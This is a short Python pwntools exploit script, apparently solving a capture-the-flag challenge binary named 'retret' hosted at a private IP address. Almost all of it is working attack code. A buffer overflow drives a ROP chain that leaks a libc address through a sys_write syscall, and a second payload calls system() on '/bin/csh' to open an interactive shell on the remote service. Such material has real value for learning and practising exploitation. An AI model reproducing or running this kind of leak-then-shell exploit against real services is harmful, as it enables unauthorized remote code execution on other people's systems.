from pwn import *

# Binary setup
e = ELF('./retret')
libc = ELF('./libc.so.6')

# ====== Key Gadgets ======
pop_eax_ecx = 0x08049099  # pop eax; pop ecx; ret (CRITICAL)
pop_ebx = 0x0804901e      # pop ebx; ret
pop_ecx = 0x0804909a      # pop ecx; ret
pop_edx = 0x080490f6      # pop edx; ret
int_0x80 = 0x080490a7     # int 0x80
ret = 0x0804900a          # Stack alignment

# p = process(['./retret'], env={'LD_PRELOAD': './libc.so.6'})
p = remote("10.20.12.187", 4005)

# ===== Stage 1: Leak libc =====
payload = flat(
    b'A' * 0x1000,        # Buffer overflow
    b'BBBB',              # Saved EBP
    
    # Set syscall number (4 = sys_write)
    pop_eax_ecx,
    4,                    # eax = 4
    0xdeadbeef,           # ecx (dummy)
    
    # Syscall arguments
    pop_ebx, 1,           # fd = stdout
    pop_ecx, e.got['__libc_start_main'],  # buffer
    pop_edx, 4,           # length
    
    int_0x80,             # Trigger syscall
    e.sym['main']         # Restart program
)

p.send(payload)
leak = u32(p.recv(4))
print("leak: ", hex(leak))
libc_base = leak - libc.symbols['__libc_start_main']
success(f"Libc base: {hex(libc_base)}")

# ===== Stage 2: Call system("/bin/csh") =====
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + 0x1804c1  # From hexdump: 001804c0  00 2f 62 69...
# /bin/csh address in libc (from hexdump)
# binsh_addr = 0x1804c1   # Adjust using libc_base if ASLR enabled

payload = flat(
    b'A' * 0x1000,
    b'CCCC',              # Saved EBP
    system_addr,
    ret,                  # Stack alignment
    binsh_addr
)

p.sendlineafter(b": ", payload)
p.interactive()
